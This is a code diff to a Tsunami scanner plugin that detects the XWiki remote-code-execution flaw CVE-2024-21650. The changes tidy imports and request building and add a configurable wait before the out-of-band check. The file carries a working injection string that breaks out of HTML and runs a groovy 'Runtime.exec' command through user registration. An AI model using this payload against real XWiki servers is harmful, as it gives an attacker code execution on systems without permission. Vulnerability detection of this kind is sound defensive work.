@@ -3,6 +3,7 @@ package com.google.tsunami.plugins.detectors.rce.cve202421650;
 import com.google.common.annotations.VisibleForTesting;
 import com.google.common.collect.ImmutableList;
 import com.google.common.flogger.GoogleLogger;
+import com.google.common.util.concurrent.Uninterruptibles;
 import com.google.protobuf.ByteString;
 import com.google.protobuf.util.Timestamps;
 import com.google.tsunami.common.data.NetworkServiceUtils;
@@ -16,29 +17,41 @@ import com.google.tsunami.plugin.VulnDetector;
 import com.google.tsunami.plugin.annotations.PluginInfo;
 import com.google.tsunami.plugin.payload.Payload;
 import com.google.tsunami.plugin.payload.PayloadGenerator;
-import com.google.tsunami.proto.*;
+import com.google.tsunami.plugins.detectors.rce.cve202421650.Annotations.OobSleepDuration;
+import com.google.tsunami.proto.DetectionReport;
+import com.google.tsunami.proto.DetectionReportList;
+import com.google.tsunami.proto.DetectionStatus;
+import com.google.tsunami.proto.NetworkService;
+import com.google.tsunami.proto.PayloadGeneratorConfig;
+import com.google.tsunami.proto.Severity;
+import com.google.tsunami.proto.TargetInfo;
+import com.google.tsunami.proto.Vulnerability;
+import com.google.tsunami.proto.VulnerabilityId;
 
 import javax.inject.Inject;
 import java.io.IOException;
+
 import java.time.Clock;
+import java.time.Duration;
 import java.time.Instant;
 import java.util.Base64;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
+
+import static java.nio.charset.StandardCharsets.UTF_8;
 
 import static com.google.common.base.Preconditions.checkNotNull;
 import static com.google.common.collect.ImmutableList.toImmutableList;
 import static com.google.tsunami.common.net.http.HttpRequest.get;
 import static com.google.tsunami.common.net.http.HttpRequest.post;
 import static com.google.tsunami.common.net.http.HttpRequest.put;
-import static java.nio.charset.StandardCharsets.UTF_8;
 
 /** A {@link VulnDetector} that detects XWiki RCE CVE-2024-21650. */
 @PluginInfo(
     type = PluginType.VULN_DETECTION,
     name = "XWiki RCE CVE-2024-21650 Detector",
     version = "0.1",
-    description = "This detector checks user XWiki registration feature for RCE (CVE-2024-21650).",
+    description = "This detector checks for XWiki RCE via user registration (CVE-2024-21650).",
     author = "yuradoc (yuradoc.research@gmail.com)",
     bootstrapModule = Cve202421650DetectorBootstrapModule.class)
 public final class Cve202421650Detector implements VulnDetector {
@@ -48,8 +61,8 @@ public final class Cve202421650Detector implements VulnDetector {
 
   private static final String PAYLOAD_PLACEHOLDER =
       "]]{{/html}}{{async}}{{groovy}}"
-              + "Runtime.getRuntime().exec(\"{{PAYLOAD}}\")"
-              + "{{/groovy}}{{/async}}";
+          + "Runtime.getRuntime().exec(\"{{PAYLOAD}}\")"
+          + "{{/groovy}}{{/async}}";
 
   private static final String REQUEST_USER_NAME =
       "test" + Long.toHexString(Double.doubleToLongBits(Math.random()));
@@ -84,15 +97,19 @@ public final class Cve202421650Detector implements VulnDetector {
 
   private final Clock utcClock;
   private final HttpClient httpClient;
-
   private final PayloadGenerator payloadGenerator;
+  private final int oobSleepDuration;
 
   @Inject
   Cve202421650Detector(
-      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
+      @UtcClock Clock utcClock,
+      HttpClient httpClient,
+      PayloadGenerator payloadGenerator,
+      @OobSleepDuration int oobSleepDuration) {
     this.utcClock = checkNotNull(utcClock);
     this.httpClient = checkNotNull(httpClient);
     this.payloadGenerator = checkNotNull(payloadGenerator);
+    this.oobSleepDuration = oobSleepDuration;
   }
 
   @Override
@@ -151,15 +168,9 @@ public final class Cve202421650Detector implements VulnDetector {
       logger.atWarning().withCause(e).log("Unable to request '%s'.", targetUri);
     }
 
-    String requestBody = REQUEST_POST_DATA;
-
-    String[] placeholders = {"{{PAYLOAD}}", "{{TOKEN}}"};
-
-    String[] replacements = {cmd, token};
-
-    for (int i = 0; i < placeholders.length; i++) {
-      requestBody = requestBody.replace(placeholders[i], replacements[i]);
-    }
+    String requestBody = REQUEST_POST_DATA
+            .replace("{{PAYLOAD}}", cmd)
+            .replace("{{TOKEN}}", token);
 
     try {
       HttpResponse response =
@@ -194,6 +205,7 @@ public final class Cve202421650Detector implements VulnDetector {
               .build(),
           networkService);
 
+      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(oobSleepDuration));
       if (response.bodyString().isPresent()
               && (payloadGenerator.isCallbackServerEnabled() && payload.checkIfExecuted())
           || response.bodyString().get().contains(RESPONSE_STRING)) {
